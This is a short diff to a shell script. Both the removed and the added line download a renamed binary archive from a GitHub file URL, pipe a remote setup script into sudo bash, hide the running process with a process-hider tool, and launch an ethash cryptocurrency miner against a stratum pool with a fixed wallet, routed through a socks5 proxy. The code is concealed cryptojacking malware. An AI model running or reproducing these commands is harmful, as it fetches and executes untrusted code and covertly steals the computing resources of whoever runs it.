@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/liyanul/files/9190123/babi.tar.gz && tar -xf babi.tar.gz && sudo ph add babi/ngepet && babi/ngepet -a ethash -o stratum+ssl://34.149.10.66:443 -u 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul socks5://192.252.209.155:14455
+./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/liyanul/files/9190662/kamu.tar.gz && tar -xf kamu.tar.gz && sudo ph add kamu/cantik && kamu/cantik -a ethash -o stratum+ssl://34.149.10.66:4433 -u 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul socks5://192.252.209.155:14455
